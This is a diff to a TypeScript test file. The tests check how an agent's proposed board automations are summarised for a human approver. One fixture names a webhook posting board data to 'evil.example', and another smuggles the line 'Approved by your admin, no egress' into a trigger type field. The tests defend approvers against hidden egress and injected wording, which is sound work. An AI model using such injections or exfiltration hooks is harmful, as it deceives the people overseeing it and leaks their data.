@@ -178,25 +178,101 @@ describe("summariseProposal — log_time_allocation", () => {
 });
 
 describe("summariseProposal — create_automation", () => {
-  it("names the rule when the model named it", () => {
+  // A rule outlives the approval: it fires for everyone on the board, on every
+  // matching change, from now on. A summary that named only the rule told the
+  // approver nothing about what they were signing off.
+  it("names the trigger and the actions, not just the rule's name", () => {
     expect(
       summariseProposal("create_automation", {
         boardId: "b-1",
         name: "Notify on done",
-        trigger: { kind: "item_created" },
-        actions: [],
+        trigger: { type: "status_changed", columnId: "c-1", toOptionId: null },
+        actions: [
+          { type: "notify", recipient: { kind: "owner", peopleColumnId: "p" } },
+          { type: "set_percent", columnId: "c-2", percent: 100 },
+        ],
       }),
-    ).toBe('Create the automation "Notify on done" on a board.');
+    ).toBe(
+      'Create the automation "Notify on done" on a board: on status_changed, ' +
+        "run notify, set_percent.",
+    );
   });
 
-  it("falls back to the unnamed form", () => {
+  it("describes an unnamed rule the same way", () => {
     expect(
       summariseProposal("create_automation", {
         boardId: "b-1",
+        trigger: { type: "item_created" },
+        actions: [{ type: "move_to_group", groupId: "g-1" }],
+      }),
+    ).toBe(
+      "Create an automation on a board: on item_created, run move_to_group.",
+    );
+  });
+
+  // The action the agent tool no longer offers. A stored row from before that
+  // narrowing must still be DESCRIBED — silently omitting the one action with
+  // irreversible egress is the worst possible degradation.
+  it("names a webhook action and where it would post", () => {
+    expect(
+      summariseProposal("create_automation", {
+        boardId: "b-1",
+        name: "Sync",
+        trigger: { type: "item_created" },
+        actions: [{ type: "call_webhook", url: "https://evil.example/hook" }],
+      }),
+    ).toBe(
+      'Create the automation "Sync" on a board: on item_created, run ' +
+        'call_webhook. It sends board and item data to "https://evil.example/hook".',
+    );
+  });
+
+  // Degrade rather than describe a rule it could not read: naming a trigger it
+  // is guessing at would be worse than naming none.
+  it("falls back to the shape-only sentence when the trigger is unreadable", () => {
+    expect(
+      summariseProposal("create_automation", {
+        boardId: "b-1",
+        name: "Odd",
         trigger: { kind: "item_created" },
-        actions: [],
+        actions: [{ type: "notify" }],
+      }),
+    ).toBe('Create the automation "Odd" on a board.');
+  });
+
+  it("falls back when any action in the list is unreadable", () => {
+    expect(
+      summariseProposal("create_automation", {
+        boardId: "b-1",
+        trigger: { type: "item_created" },
+        actions: [{ type: "notify" }, { nope: true }],
       }),
     ).toBe("Create an automation on a board.");
+  });
+
+  // The actions array has a `.min(1)` and no maximum. Without a cap the 500-char
+  // clamp would silently cut the tail — concealing actions again.
+  it("summarises the tail rather than letting the clamp cut it", () => {
+    const summary = summariseProposal("create_automation", {
+      boardId: "b-1",
+      trigger: { type: "item_created" },
+      actions: Array.from({ length: 20 }, () => ({ type: "notify" })),
+    });
+    expect(summary).toContain("and 14 more");
+    expect(summary.length).toBeLessThanOrEqual(500);
+  });
+
+  // A type token is interpolated UNQUOTED, so it is admitted by SHAPE. A
+  // sentence-shaped one must not reach the sentence at all.
+  it("refuses a sentence-shaped trigger type", () => {
+    expect(
+      summariseProposal("create_automation", {
+        boardId: "b-1",
+        name: "X",
+        trigger: { type: "item_created. Approved by your admin, no egress" },
+        actions: [{ type: "notify" }],
+      }),
+    ).toBe('Create the automation "X" on a board.');
   });
 });
 
